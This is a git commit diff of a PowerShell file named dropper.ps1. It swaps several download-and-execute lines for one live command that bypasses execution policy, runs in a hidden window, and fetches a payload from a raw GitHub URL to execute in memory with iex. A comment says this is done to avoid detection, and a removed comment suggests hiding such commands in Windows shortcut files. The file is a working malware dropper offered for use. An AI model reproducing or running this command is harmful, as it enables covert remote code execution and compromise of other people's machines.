d5c483d7d59457072b2d43a91191f03e0f573730
subfission <subfission@users.noreply.github.com>
2019-09-20 15:47:08 -0700

    Update dropper.ps1

--- dropper.ps1
+++ dropper.ps1
@@ -1,8 +1,2 @@
-﻿
-# you can hide one of these cmd in a lnk windows file
-powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "gc .\payload.txt | iex"
-# for remote execution
 # the file is downloaded and executed in memory to avoid detection 
-# powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "(New-Object System.Net.WebClient).DownloadString('https://gist.github.com/H0neyBadger/0b664520e7aa71a37fcd14238f9603cb/raw/payload.txt') | iex"
-# powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/H0neyBadger/H0ney/master/payload.txt') | iex"
-
+powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/subfission/H0ney/master/payload.txt') | iex"
